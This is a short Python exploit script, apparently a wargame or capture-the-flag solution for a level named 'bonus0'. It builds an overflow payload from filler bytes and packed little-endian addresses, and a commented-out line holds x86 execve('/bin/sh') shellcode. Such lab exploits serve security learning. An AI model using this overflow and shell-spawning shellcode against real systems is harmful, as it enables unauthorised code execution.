#!/usr/bin/env python3

from struct import pack

def isprint(c): return c >= 0x20 and c <= 0x7e
def p(x): return pack('<I', x)

# payload = b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
# payload = p(0xb7e6b060)
payload = b"B" * 4095
payload += b"\n"
payload += b"X" * 7
payload += p(0x0c0d60b6) # e6b060b7
payload += p(0xe7b00a0b)
payload += p(0xe8b060b8)
payload += p(0xe9b060b9)
payload += b"C" * 8
payload += b"\n"
# print(len(payload))

for c in payload:
    if isprint(c): print(chr(c), end='')
    else: print("\\x%02x" % c, end='')

with open("payload-bonus0.bin", "wb") as f:
    f.write(payload)
